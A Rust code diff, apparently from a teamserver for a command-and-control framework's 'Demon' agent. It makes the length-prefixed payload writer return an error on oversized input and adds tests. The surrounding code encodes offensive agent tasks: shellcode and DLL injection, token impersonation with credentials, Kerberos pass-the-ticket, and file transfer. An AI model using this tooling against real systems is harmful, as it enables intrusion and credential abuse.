@@ -1077,7 +1077,7 @@ fn build_upload_jobs(
         let mut payload = Vec::new();
         write_u32(&mut payload, memfile_id);
         write_u64(&mut payload, u64::try_from(content.len()).unwrap_or_default());
-        write_len_prefixed_bytes(&mut payload, chunk);
+        write_len_prefixed_bytes(&mut payload, chunk)?;
         jobs.push(Job {
             command: u32::from(DemonCommand::CommandMemFile),
             request_id: random_u32(),
@@ -1091,7 +1091,7 @@ fn build_upload_jobs(
 
     let mut payload = Vec::new();
     write_u32(&mut payload, u32::from(DemonFilesystemCommand::Upload));
-    write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path));
+    write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path))?;
     write_u32(&mut payload, memfile_id);
     jobs.push(Job {
         command: u32::from(DemonCommand::CommandFs),
@@ -1200,31 +1200,31 @@ fn encode_fs_payload(
                 return Err(AgentCommandError::MissingField { field: "Arguments" });
             }
             write_u32(&mut payload, 0);
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[0]));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[0]))?;
             write_u32(&mut payload, u32::from(parse_bool_field("Arguments[1]", parts[1])?));
             write_u32(&mut payload, u32::from(parse_bool_field("Arguments[2]", parts[2])?));
             write_u32(&mut payload, u32::from(parse_bool_field("Arguments[3]", parts[3])?));
             write_u32(&mut payload, u32::from(parse_bool_field("Arguments[4]", parts[4])?));
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[5]));
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[6]));
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[7]));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[5]))?;
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[6]))?;
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(parts[7]))?;
         }
         DemonFilesystemCommand::Download | DemonFilesystemCommand::Cat => {
             let path = decode_base64_required(info, &["Arguments"], "Arguments")?;
             let path = String::from_utf8_lossy(&path).into_owned();
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path))?;
         }
         DemonFilesystemCommand::Upload => {
             let remote_path = upload_remote_path(info)?;
             let memfile_id = required_u32(info, &["MemFileId"], "MemFileId")?;
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&remote_path))?;
             write_u32(&mut payload, memfile_id);
         }
         DemonFilesystemCommand::Cd
         | DemonFilesystemCommand::Remove
         | DemonFilesystemCommand::Mkdir => {
             let path = required_string(info, &["Arguments"], "Arguments")?;
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&path))?;
         }
         DemonFilesystemCommand::Copy | DemonFilesystemCommand::Move => {
             let args = required_string(info, &["Arguments"], "Arguments")?;
@@ -1236,8 +1236,8 @@ fn encode_fs_payload(
                 .into_owned();
             let to = String::from_utf8_lossy(&decode_base64_field("Arguments[1]", parts[1])?)
                 .into_owned();
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(&from));
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(&to));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&from))?;
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&to))?;
         }
         DemonFilesystemCommand::GetPwd => {}
     }
@@ -1272,8 +1272,8 @@ fn encode_proc_command_payload(
             let process_args = String::from_utf8_lossy(&process_args).into_owned();
 
             write_u32(&mut payload, state);
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(program));
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(&process_args));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(program))?;
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&process_args))?;
             write_u32(&mut payload, u32::from(piped));
             write_u32(&mut payload, u32::from(verbose));
         }
@@ -1283,7 +1283,7 @@ fn encode_proc_command_payload(
         }
         DemonProcessCommand::Grep => {
             let pattern = required_string(info, &["Args", "Arguments"], "Args")?;
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(&pattern));
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&pattern))?;
         }
         DemonProcessCommand::Memory => {
             let arguments = required_string(info, &["Args", "Arguments"], "Args")?;
@@ -1316,8 +1316,8 @@ fn encode_inject_shellcode_payload(
             write_u32(&mut payload, u32::from(DemonInjectWay::Inject));
             write_u32(&mut payload, parse_injection_technique(&technique)?);
             write_u32(&mut payload, arch_to_flag(&arch)?);
-            write_len_prefixed_bytes(&mut payload, &binary);
-            write_len_prefixed_bytes(&mut payload, &arguments);
+            write_len_prefixed_bytes(&mut payload, &binary)?;
+            write_len_prefixed_bytes(&mut payload, &arguments)?;
             let pid = required_u32(info, &["PID"], "PID")?;
             write_u32(&mut payload, pid);
         }
@@ -1325,8 +1325,8 @@ fn encode_inject_shellcode_payload(
             write_u32(&mut payload, u32::from(DemonInjectWay::Spawn));
             write_u32(&mut payload, parse_injection_technique(&technique)?);
             write_u32(&mut payload, arch_to_flag(&arch)?);
-            write_len_prefixed_bytes(&mut payload, &binary);
-            write_len_prefixed_bytes(&mut payload, &arguments);
+            write_len_prefixed_bytes(&mut payload, &binary)?;
+            write_len_prefixed_bytes(&mut payload, &arguments)?;
         }
         other => {
             return Err(AgentCommandError::UnsupportedInjectionWay {
@@ -1379,7 +1379,7 @@ fn encode_token_payload(
             } else {
                 write_u32(&mut payload, 0);
                 let priv_name = required_string(info, &["Arguments"], "Arguments")?;
-                write_len_prefixed_bytes(&mut payload, priv_name.as_bytes());
+                write_len_prefixed_bytes(&mut payload, priv_name.as_bytes())?;
             }
         }
         DemonTokenCommand::Make => {
@@ -1395,12 +1395,12 @@ fn encode_token_payload(
             write_len_prefixed_bytes(
                 &mut payload,
                 &encode_utf16(&String::from_utf8_lossy(&domain)),
-            );
-            write_len_prefixed_bytes(&mut payload, &encode_utf16(&String::from_utf8_lossy(&user)));
+            )?;
+            write_len_prefixed_bytes(&mut payload, &encode_utf16(&String::from_utf8_lossy(&user)))?;
             write_len_prefixed_bytes(
                 &mut payload,
                 &encode_utf16(&String::from_utf8_lossy(&password)),
-            );
+            )?;
             write_u32(&mut payload, logon_type);
         }
         DemonTokenCommand::Remove => {
@@ -1472,7 +1472,7 @@ fn encode_kerberos_payload(
         DemonKerberosCommand::Ptt => {
             let ticket = decode_base64_required(info, &["Ticket"], "Ticket")?;
             let luid = parse_hex_u32(&required_string(info, &["Luid"], "Luid")?)?;
-            write_len_prefixed_bytes(&mut payload, &ticket);
+            write_len_prefixed_bytes(&mut payload, &ticket)?;
             write_u32(&mut payload, luid);
         }
     }
@@ -1492,9 +1492,9 @@ fn encode_inject_dll_payload(
     let mut payload = Vec::new();
     write_u32(&mut payload, technique);
     write_u32(&mut payload, pid);
-    write_len_prefixed_bytes(&mut payload, &loader);
-    write_len_prefixed_bytes(&mut payload, &binary);
-    write_len_prefixed_bytes(&mut payload, &arguments);
+    write_len_prefixed_bytes(&mut payload, &loader)?;
+    write_len_prefixed_bytes(&mut payload, &binary)?;
+    write_len_prefixed_bytes(&mut payload, &arguments)?;
     Ok(payload)
 }
 
@@ -1506,9 +1506,9 @@ fn encode_spawn_dll_payload(
     let arguments = optional_base64(info, &["Arguments", "Argument"])?.unwrap_or_default();
 
     let mut payload = Vec::new();
-    write_len_prefixed_bytes(&mut payload, &loader);
-    write_len_prefixed_bytes(&mut payload, &binary);
-    write_len_prefixed_bytes(&mut payload, &arguments);
+    write_len_prefixed_bytes(&mut payload, &loader)?;
+    write_len_prefixed_bytes(&mut payload, &binary)?;
+    write_len_prefixed_bytes(&mut payload, &arguments)?;
     Ok(payload)
 }
 
@@ -1830,9 +1830,12 @@ fn write_u64(buf: &mut Vec<u8>, value: u64) {
     buf.extend_from_slice(&value.to_le_bytes());
 }
 
-fn write_len_prefixed_bytes(buf: &mut Vec<u8>, value: &[u8]) {
-    write_u32(buf, u32::try_from(value.len()).unwrap_or_default());
+fn write_len_prefixed_bytes(buf: &mut Vec<u8>, value: &[u8]) -> Result<(), crate::TeamserverError> {
+    let len = u32::try_from(value.len())
+        .map_err(|_| crate::TeamserverError::PayloadTooLarge { length: value.len() })?;
+    write_u32(buf, len);
     buf.extend_from_slice(value);
+    Ok(())
 }
 
 fn upload_remote_path(
@@ -2587,8 +2590,8 @@ mod tests {
         assert_eq!(jobs.len(), 1);
         let mut expected = Vec::new();
         write_u32(&mut expected, u32::from(DemonFilesystemCommand::Copy));
-        write_len_prefixed_bytes(&mut expected, &encode_utf16("C:\\temp\\a.txt"));
-        write_len_prefixed_bytes(&mut expected, &encode_utf16("D:\\loot\\b.txt"));
+        write_len_prefixed_bytes(&mut expected, &encode_utf16("C:\\temp\\a.txt")).unwrap();
+        write_len_prefixed_bytes(&mut expected, &encode_utf16("D:\\loot\\b.txt")).unwrap();
         assert_eq!(jobs[0].command, u32::from(DemonCommand::CommandFs));
         assert_eq!(jobs[0].payload, expected);
     }
@@ -3254,5 +3257,20 @@ mod tests {
             secure: Some("false".to_owned()),
             ..ListenerInfo::default()
         }
+    }
+
+    #[test]
+    fn write_len_prefixed_bytes_normal_input() {
+        let mut buf = Vec::new();
+        write_len_prefixed_bytes(&mut buf, b"test").unwrap();
+        assert_eq!(buf[..4], 4_u32.to_le_bytes());
+        assert_eq!(&buf[4..], b"test");
+    }
+
+    #[test]
+    fn write_len_prefixed_bytes_empty_input() {
+        let mut buf = Vec::new();
+        write_len_prefixed_bytes(&mut buf, &[]).unwrap();
+        assert_eq!(buf, 0_u32.to_le_bytes());
     }
 }
